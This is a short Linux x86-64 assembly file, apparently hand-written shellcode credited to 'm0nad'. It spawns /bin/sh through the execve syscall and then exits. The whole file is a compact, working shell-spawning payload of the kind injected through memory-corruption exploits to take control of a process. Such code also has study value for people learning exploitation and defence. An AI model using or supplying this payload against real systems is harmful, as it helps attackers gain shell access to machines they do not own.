#execve ("/bin/sh"); exit (0);
#assembly linux 64bits
#m0nad /at/ email.com

.text
.globl _start
_start:

callq STR
.string "/bin/sh"
STR:
pop %rdi
xorq %rsi,%rsi
xorq %rdx, %rdx
xorq %rax, %rax
mov $0x3b,%al # execve(3b)
syscall

xorq  %rdi, %rdi
xorq %rax, %rax
mov $0x3c, %al
syscall
